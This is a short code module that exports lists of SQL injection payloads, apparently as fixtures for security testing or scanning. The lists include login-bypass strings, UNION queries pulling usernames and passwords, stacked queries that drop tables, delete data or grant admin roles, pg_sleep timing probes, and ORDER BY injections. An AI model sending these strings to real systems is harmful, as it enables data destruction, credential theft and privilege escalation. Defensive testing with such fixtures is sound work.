export const CLASSIC_SQL_PAYLOADS = [
  "'",
  '"',
  "' OR '1'='1",
  "' OR 1=1 --",
  "' OR 1=1 #",
  "' OR 1=1 /*",
  "') OR ('1'='1",
  "admin'--",
  "admin' /*",
];

export const BOOLEAN_SQL_PAYLOADS = [
  "' AND 1=1 --",
  "' AND 1=2 --",
  "' OR TRUE --",
  "' OR FALSE --",
];

export const UNION_SQL_PAYLOADS = [
  "' UNION SELECT NULL --",
  "' UNION SELECT NULL,NULL --",
  "' UNION SELECT username,password FROM users --",
];

export const STACKED_SQL_PAYLOADS = [
  "'; DROP TABLE users; --",
  "'; DELETE FROM products; --",
  "'; UPDATE users SET role='admin'; --",
];

export const TIME_BASED_SQL_PAYLOADS = [
  "'; SELECT pg_sleep(5); --",
  "' OR pg_sleep(5) IS NULL --",
];

export const ORDER_BY_SQL_PAYLOADS = [
  'created_at; DROP TABLE users; --',
  'created_at DESC',
  'created_at, password',
  '(SELECT 1)',
  'CASE WHEN (1=1) THEN name ELSE status END',
];
